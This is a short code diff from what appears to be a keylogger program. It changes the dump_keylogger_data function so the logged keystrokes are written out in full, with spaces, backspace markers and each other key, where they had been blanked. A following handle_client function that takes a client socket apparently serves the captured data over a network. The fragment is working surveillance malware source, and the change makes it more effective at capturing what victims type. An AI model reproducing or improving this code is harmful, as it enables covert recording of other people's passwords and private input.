@@ -106,10 +106,12 @@ def dump_keylogger_data():
     for key in keylogger_data:
         if key in skip_keys:
             continue
-        if key == "backspace":
-            filtered_data.append("backspace")
+        if key == "space":
+            filtered_data.append(" ")
+        elif key == "backspace":
+            filtered_data.append("[backspace]")
         else:
-            filtered_data.append("")
+            filtered_data.append(key)
     return ''.join(filtered_data)
 
 def handle_client(client_socket, addr):
